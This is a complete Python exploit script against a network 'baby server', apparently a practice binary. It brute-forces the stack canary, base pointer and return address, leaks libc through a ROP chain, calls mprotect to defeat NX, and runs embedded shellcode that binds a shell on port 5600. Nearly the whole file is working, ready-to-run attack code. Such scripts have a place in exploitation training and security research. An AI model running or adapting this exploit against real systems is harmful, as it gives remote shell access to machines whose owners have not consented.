#!/usr/bin/env python

# This exploit bypasses ASLR for the binary, Stack protection for the binary, ASLR for the libraries and DEP/NX for the binary
# It is fully ausomated and takes some time
from binascii import hexlify

import argparse
import struct
import socket
import time
import re
import sys

# Create Parser
parser = argparse.ArgumentParser(description="Baby exploitation with full mitigation by pass")

# Add Args
parser.add_argument("ipv4_address", metavar="IPv4 address", nargs="?", help="IPv4 address of baby server")
parser.add_argument("port", metavar="Port", nargs="?", type=int, help="Port of baby server")
parser.add_argument("--interval", "-i", nargs="?", type=float, help="Timing interval",  default=0.2)

# Parse
args = parser.parse_args()

# Ipv4 Addr and Port Required
if not args.ipv4_address or not args.port:
	parser.print_help()
	sys.exit(1)

# Assign Vars
ipv4_address 	= args.ipv4_address
port 			= args.port

# Build brute force exploit
data = str.encode("A" * 1032)

# Shellcode
buf = ""
buf += b"\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29"
buf += b"\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44"
buf += b"\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a"
buf += b"\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05"
buf += b"\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8"
buf += b"\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
buf += b"\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Regex
regex = re.compile("Welcome")

# Brute over canary, base pointer and return pointer
for p in range(0, 24):

	# Brute force data bytes
	for i in range(0, 256):

		# Connect
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		s.connect((ipv4_address, port))

		# Get banner
		msg = s.recv(1024)

		# Stack menu selection
		s.send(b"1\n")
		msg = s.recv(1024)

		# Add byte
		data += struct.pack("<B", i)

		# Send size
		length = len(data)
		length = str(length)
		length += "\n"
		length = str.encode(length)

		# Send length and data
		s.send(length)
		s.send(data)

		# Wait for response
		time.sleep(args.interval)

		# Recieve response
		nmsg = s.recv(1024)

		# Search for "Welcome" in response
		if(regex.search(str(nmsg))):
			
			# Print security cookie only
			if p <= 7:

				# Success move onto next byte
				print("Security Cookie Byte {}\t - 0x{}".format(p, hexlify(data[1032:])[::-1]))

			# Print basepointer
			elif p >= 8 and p <= 15:
				
				# Success move onto next byte
				print("Base Pointer Byte {}\t - 0x{}".format(p - 8, hexlify(data[1040:])[::-1]))

			# Print return pointer
			else:

				# Success move onto next byte
				print("Return Address Byte {}\t - 0x{}".format(p - 16, hexlify(data[1048:])[::-1]))

			break

		else:

			# Remove last data byte
			data = data[:-1]

		# Close and continue
		s.close()

raw_input("\nPress any key to continue...")

# Extract cookie
cookie = struct.unpack("<Q", data[1032:1040])[0]
print("Cookie: " + hex(cookie))

# Extract base pointer
base = struct.unpack("<Q", data[1040:1048])[0]
print("Base: " + hex(base))

# Extract return pointer
retp = struct.unpack("<Q", data[1048:])[0]
print("RetP: " + hex(retp))

# Calculate load address from base
loadb = retp - 0x1954
print("LoadB: " + hex(loadb))

# Calculate absolute address of libc accept
sendplt = loadb + 0xe50
print("Send: " + hex(sendplt))

# Wait for interaction
raw_input("\nPress any key to continue...")

# Extract libc base
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ipv4_address, port))

# Get banner
msg = s.recv(1024)

# Stack menu selection
s.send(b"1\n")
msg = s.recv(1024)

# Build rop chain for libc address
data = str.encode("A" * 1032)
data += struct.pack("<Q", cookie)
data += struct.pack("<Q", base)
data += struct.pack("<Q", loadb + 0x0000000000001c8b) 	# pop rdi; ret;
data += struct.pack("<Q", 0x4) 							# Value: 4 (FD)
data += struct.pack("<Q", loadb + 0x0000000000001c89) 	# pop rsi; pop r15; ret;
data += struct.pack("<Q", loadb + 0x202f90) 			# Accept GOT entry
data += struct.pack("<Q", 0xAAAAAAAAAAAAAAAA) 			# Junk
data += struct.pack("<Q", loadb + 0x0000000000012a4) 	# Sendlen

# Send size
length = len(data)
length = str(length)
length += "\n"
length = str.encode(length)
s.send(length)

# Send payload
s.send(data)
time.sleep(args.interval)
msg = s.recv(1024)

# Extract absolute address of libc accept
acceptg = msg[12:18]
acceptg += b"\x00\x00"
acceptg = struct.unpack("<Q", acceptg)[0]
print("Accept: " + hex(acceptg))

# Calculate libc base address
libcbase = acceptg - 0x00000000000e7e80
print("libc Base: " + hex(libcbase))

s.close()

# Wait for interaction
raw_input("\nPress any key to continue...")

# Turn of NX and run shellcode
time.sleep(args.interval)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ipv4_address, port))

# Get banner
msg = s.recv(1024)

# Stack menu selection
s.send(b"1\n")
msg = s.recv(1024)

# Using libc build rop chain for mprotect call
data = str.encode("A" * 1032)
data += struct.pack("<Q", cookie)
data += struct.pack("<Q", base)
data += struct.pack("<Q", libcbase + 0x00000000000361d8) 	# pop rax; ret;
data += struct.pack("<Q", 0xA) 								# 10 (mprotect)
data += struct.pack("<Q", libcbase + 0x0000000000020df2) 	# pop rdi; ret;
data += struct.pack("<Q", base & 0xfffffffffffff000) 		# Address
data += struct.pack("<Q", libcbase + 0x00000000000201e8) 	# pop rsi; ret;
data += struct.pack("<Q", 0x3E8) 							# 1000 butes
data += struct.pack("<Q", libcbase + 0x0000000000001b92) 	# pop rdx; ret;
data += struct.pack("<Q", 0x7) 								# Flags (rwx)
data += struct.pack("<Q", libcbase + 0x00000000000a7f05) 	# syscall; ret;

# Calculate absolute shellcode address
data += struct.pack("<Q", base + 0x28)	 					# Shellcode address

# Shellcode bind to 5600
data += buf

# Send size
length = len(data)
length = str(length)
length += "\n"
length = str.encode(length)
s.send(length)
time.sleep(args.interval)

# Send final exploit
s.send(data)
time.sleep(args.interval)
msg = s.recv(1024)

# Clean up
s.close()

print("Listener on port 5600 for address {}".format(ipv4_address))
